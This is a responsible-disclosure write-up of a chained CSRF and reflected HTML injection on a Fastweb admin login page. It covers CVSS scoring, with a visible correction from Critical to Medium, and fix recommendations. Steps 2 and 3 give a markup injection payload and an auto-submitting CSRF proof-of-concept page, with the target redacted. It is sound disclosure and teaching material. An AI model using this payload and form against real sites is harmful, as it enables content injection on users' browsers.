# Chained CSRF → Reflected HTML/Markup Injection on an Admin Login Panel

**Program:** Fastweb S.p.A. — Responsible Disclosure Programme (public Hall of Fame, 2025)
**Report:** RD-0001622
**Vulnerability class:** CSRF-delivered reflected injection — OWASP 2021 A3 (Injection)
**Endpoint type:** Admin CMS login page (POST)
**CVSS v3.1:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Status:** Accepted — Hall of Fame recognition
**Discovery:** Q1 2025

> **Scoring note.** I first submitted this at 9.3 (Critical). That was wrong, and I'm leaving the correction visible rather than quietly restating it. My PoC demonstrated that unsanitized attacker HTML — an anchor element and a heading — was reflected and rendered. I did **not** demonstrate script execution, and the injection point is a **pre-authentication** login page, so there was no established session to compromise. Medium is the honest rating. Full reasoning in the portfolio scoring note.

## TL;DR
The admin login form carried no CSRF protection and reflected the `username` field into the response unsanitized. Chained, a reflection that is normally Self-only becomes a one-click, attacker-deliverable reflected injection against the login page, with no attacker authentication. What the PoC proves is unsanitized reflection of attacker-controlled HTML; full script execution was not demonstrated, which is why this is Medium rather than the Critical I originally claimed.

## Root cause
Two independent weaknesses:

1. **Missing CSRF token** — no server-side check that a POST originated from the legitimate login page, so any external page could submit the form on a visitor's behalf.
2. **Unsanitized reflection** — the `username` value was reflected verbatim into the response body with no HTML encoding, so injected markup rendered in the browser.

On a pre-auth login page neither is impactful alone. Chained, they make the reflection remotely deliverable with a single click.

## CVSS v3.1 breakdown
| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Remote, no local access |
| Attack Complexity | Low | No special preconditions |
| Privileges Required | None | Attacker needs no account |
| User Interaction | Required | Victim clicks one link |
| Scope | Changed | Injected content renders under the target's origin |
| Confidentiality | Low | Reflected content in the victim's browser; no demonstrated data access |
| Integrity | Low | Page-content manipulation; no demonstrated backend impact |
| Availability | None | No availability impact |
| **Base score** | **6.1 — Medium** | |

Why not the 9.3 I first submitted: I originally set `S:C/C:H/I:H` on the theory that an admin-origin XSS yields session and admin-action compromise. But the PoC rendered an anchor tag and a heading — HTML injection, not demonstrated script execution — and the injection point is the pre-auth login page, so there is no admin session there to steal. Scoring the theoretical ceiling of the bug class instead of the demonstrated impact is exactly the error I have since corrected across my reports.

## Attack chain
```
[Attacker] hosts an auto-submitting form carrying the injection payload
      │
      ▼
[Victim opens the page] → browser auto-POSTs the forged request
      │  (no CSRF token to block it)
      ▼
[Target] reflects the username value into the response unencoded
      │
      ▼
[Victim's browser] renders the injected markup under the target's origin
```

## Reproduction (redacted)
Target domain and the dynamically generated field name are redacted.

**Step 1 — Confirm no CSRF protection.** The login form accepts a cross-origin POST with a `username` parameter; no token is present or validated.

**Step 2 — Confirm the reflection.** POST the `username` value:
```
test"><a href="https://example.com">link</a><h1>injected</h1>
```
If the anchor and heading render in the response, unsanitized reflection is confirmed. This is what the accepted PoC demonstrated.

**Step 3 — CSRF delivery page.** Save as `poc.html` and host it:
```html
<!DOCTYPE html>
<html><body>
  <form action="https://[TARGET]/admin/login/" method="POST" id="f">
    <input type="hidden" name="username_fieldname" value="username_[RANDOMIZED]">
    <input type="hidden" name="username_[RANDOMIZED]"
           value='"><a href="https://example.com">link</a><h1>injected</h1>'>
  </form>
  <script>document.getElementById('f').submit();</script>
</body></html>
```

**Step 4 — Deliver.** Send the URL to a victim. On load the form auto-submits and the injected markup renders on the target's origin.

**On escalation:** replacing the markup with a script payload is the theoretical next step. I did not demonstrate script execution in the accepted PoC, so I do not claim it — a reviewer should treat script execution as unverified until shown.

## Fix recommendations
1. **CSRF tokens (primary).** Per-session, cryptographically random, validated on every POST; reject missing/invalid with 403.
2. **Output encoding (primary).** Context-appropriate HTML encoding of every reflected value (`<`→`&lt;`, `>`→`&gt;`, `"`→`&quot;`, `'`→`&#x27;`, `&`→`&amp;`) via a tested library, not manual replacement.
3. **SameSite cookies.** `SameSite=Strict` or `Lax` on session cookies as a second line against CSRF.
4. **Content-Security-Policy.** A strict nonce-based CSP would break the escalation path even if reflection persists.

## Key takeaway
Two weaknesses programs routinely reject in isolation — CSRF on a login form, and a reflection that on its own is Self-only — combine into a remotely deliverable reflected injection. That composition is the finding. The second lesson is the scoring: I first called this Critical, and it isn't. A severity rating is only worth what it can be trusted at, and the honest number here is Medium.
